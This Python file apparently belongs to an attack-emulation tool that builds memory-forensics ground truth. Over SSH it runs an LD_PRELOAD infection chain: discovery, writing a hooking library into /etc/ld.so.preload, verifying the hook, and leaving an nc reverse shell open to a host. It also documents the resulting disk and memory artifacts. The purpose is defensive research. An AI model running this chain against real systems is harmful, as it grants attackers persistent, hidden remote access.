"""
orchestrator/attacks/scenario_01_ldpreload.py

Scenario 01 -- LD_PRELOAD infection via /etc/ld.so.preload

Attack narrative
----------------
The attacker gains initial SSH access as an unprivileged user.  They perform
system discovery, compile a malicious shared library that hooks getuid(3),
write it to /etc/ld.so.preload, then trigger the hook by spawning a new
process.  A reverse shell is established from inside that hooked process,
leaving the .so mapped in memory.  Cleanup optionally reverts each ART test.

Steps
-----
1. T1082        -- system info collection -> /tmp/T1082.txt (recorded)
2. T1574.006    -- compile .so + write /etc/ld.so.preload
3. custom       -- spawn process, verify hook active in /proc/<pid>/maps
4. T1059.004    -- mkfifo+nc reverse shell (leaves socket + .so in memory)
5. cleanup only when run_cleanup=True: run each executed ART test's
   cleanup_command (T1082 removes /tmp/T1082.txt; T1574.006 unhooks
   /etc/ld.so.preload via sed). The custom steps (trigger, reverse shell) have
   no ART cleanup. Recorded as a single "cleanup" step.

Forensic artifacts
------------------
Disk:
  /etc/ld.so.preload   written by step 2; unhooked (emptied) by cleanup
  /tmp/T1574006.so     compiled .so; NOT removed by cleanup -- persists
  /tmp/T1082.txt       discovery output; deleted by cleanup (T1070.004 tombstone)

Memory:
  any process spawned after step 2 has /tmp/T1574006.so mapped
  reverse shell process: open TCP socket + /tmp/T1574006.so in maps
  (memory mappings outlive the disk cleanup)

Ground-truth shape
------------------
The orchestrator pre-builds `ground_truth = {"scenario_id": ..., "steps": []}`
and passes it in. run() appends per-step dicts to ground_truth["steps"]; the
orchestrator persists the dict in a finally clause so partial runs survive a
mid-scenario exception.
"""

from __future__ import annotations
from functools import partial

from typing import Any

from orchestrator.attacks.art_runner import ArtRunner
from orchestrator.attacks.helpers import (
    ArtStep,
    run_art_step,
    run_reverse_shell,
)
from orchestrator.core import console
from orchestrator.core.ssh_client import SSHClient

# --- ART step descriptors -----------------------------------------------

_DISCOVERY = ArtStep(
    name="discovery",
    technique="T1082",
    guid="cccb070c-df86-4216-a5bc-9fb60c74e27c",  # List OS Information
)

_LDPRELOAD = ArtStep(
    name="ldpreload",
    technique="T1574.006",
    guid="39cb0e67-dd0d-4b74-a74b-c072db7ae991",  # /etc/ld.so.preload
    has_prereq=True,
)


# --- public entry point -------------------------------------------------


def run(
    ssh: SSHClient,
    runner: ArtRunner,
    host_ip: str,
    internet_on,
    internet_off,
    ground_truth: dict[str, Any],
    *,
    run_cleanup: bool = False,
) -> None:
    _step = partial(
        run_art_step, runner, internet_on=internet_on, internet_off=internet_off
    )
    steps = ground_truth["steps"]
    # ART tests executed this run, in order. Cleanup reverts each one's
    # cleanup_command (if any); custom steps (trigger, reverse shell) are not
    # ART and have no cleanup.
    art_tests: list[ArtStep] = []

    # Discovery (T1082) writes /tmp/T1082.txt (uname, os-release, uptime), which
    # persists on disk in a no-cleanup run, so the discovery_output spec covers
    # it. Record the step so the evaluator scores it: ground_truth must mirror
    # the spec step names exactly. Best-effort (no raise_on_error): a discovery
    # failure should not abort the attack.
    console.step_header("[1/4] discovery")
    steps.append(_step(_DISCOVERY))
    art_tests.append(_DISCOVERY)

    console.step_header("[2/4] LD_PRELOAD infection")
    steps.append(_step(_LDPRELOAD, raise_on_error=True))
    art_tests.append(_LDPRELOAD)

    console.step_header("[3/4] LD_PRELOAD hook trigger")
    steps.append(_trigger_hook(ssh))

    console.step_header("[4/4] reverse shell")
    # keep_open=True leaves the socket ESTABLISHED with nc resident through
    # memory acquisition, so linux.sockstat recovers it (sockscan still backs
    # up the post-mortem CLOSE case when run with keep_open=False).
    run_reverse_shell(ssh, host_ip, steps, keep_open=True)

    if run_cleanup:
        console.step_header("cleanup")
        _run_cleanups(runner, art_tests, steps)
    else:
        # No cleanup step recorded: with run_cleanup=False the cleanup-phase
        # specs have nothing to match, so ground_truth carries only the attack
        # steps (discovery, ldpreload, ldpreload_trigger, reverse_shell).
        console.step_header("cleanup (skipped: artifacts preserved)")


# --- scenario-local helpers ---------------------------------------------


def _run_cleanups(
    runner: ArtRunner,
    art_tests: list[ArtStep],
    steps: list[dict[str, Any]],
) -> None:
    # Run each executed ART test's cleanup_command (ArtRunner.run_cleanup no-ops
    # when none is defined) and record the techniques actually reverted as one
    # analytic "cleanup" step the cleanup-phase specs bind to. Technique label is
    # T1070.004 (Indicator Removal: File Deletion): cleanup's net forensic effect
    # here is deleting the discovery output and unhooking the preload config.
    reverted: list[str] = []
    for test in art_tests:
        if runner.run_cleanup(
            test.technique, test.guid, input_arguments=test.input_arguments or None
        ):
            reverted.append(test.technique)
    steps.append(
        {
            "step": "cleanup",
            "technique": "T1070.004",
            "reverted": reverted,
            "run": True,
        }
    )


def _trigger_hook(ssh: SSHClient) -> dict[str, Any]:
    cmd = "sh -c 'sleep 300 >/dev/null 2>&1 & echo $!'"
    code, out, _ = ssh.run(cmd, timeout=10)
    pid = out.strip()
    code2, maps_out, _ = ssh.run(f"grep T1574006.so /proc/{pid}/maps", timeout=10)
    loaded = code2 == 0 and "T1574006.so" in maps_out
    return {
        "step": "ldpreload_trigger",
        "technique": "T1574.006",
        "exit_code": code,
        "trigger_pid": pid,
        "so_loaded": loaded,
        "maps_excerpt": maps_out.strip(),
    }
